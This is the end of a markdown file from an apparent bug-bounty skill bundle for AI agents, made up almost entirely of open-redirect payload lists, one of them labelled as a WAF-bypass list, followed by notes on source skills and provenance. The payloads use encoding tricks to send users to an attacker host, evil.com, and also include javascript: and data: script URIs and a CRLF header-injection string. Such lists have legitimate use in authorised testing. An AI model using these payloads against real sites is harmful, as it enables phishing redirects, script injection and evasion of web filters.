https://target.com#@evil.com
https://target.com?@evil.com
https://evil.com#target.com
https://evil.com?target.com
https://target.com/redirect?url=https://evil.com
//target.com.evil.com
//target.com@evil.com
//target.com%2f@evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com/%0d%0aLocation:%20https://evil.com
https://evil.com%2f..%2ftarget.com
https://evil.com/%2e%2e/target.com
%2f%2fevil.com
%252f%252fevil.com
https:%2f%2fevil.com
//evil.com\@target.com
//evil.com%5c@target.com
//evil.com	.target.com
//evil.com%09.target.com
```

### `payloads_open-redirect_waf.txt`

```text
https://target.com@evil.com
https://target.com.evil.com
https://target.com\@evil.com
https://target.com%2f@evil.com
https://target.com%00.evil.com
https://target.com%20.evil.com
https://target.com#@evil.com
https://target.com?@evil.com
https://evil.com#target.com
https://evil.com?target.com
https://target.com/redirect?url=https://evil.com
//target.com.evil.com
//target.com@evil.com
//target.com%2f@evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com/%0d%0aLocation:%20https://evil.com
https://evil.com%2f..%2ftarget.com
https://evil.com/%2e%2e/target.com
%2f%2fevil.com
%252f%252fevil.com
https:%2f%2fevil.com
//evil.com\@target.com
//evil.com%5c@target.com
//evil.com	.target.com
//evil.com%09.target.com
```

## Source skills merged into this topic

- `h1skills` — `hackerone-open-redirect`
- `hunting` — `open-redirect`
- `cbh` — `hunt-open-redirect`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
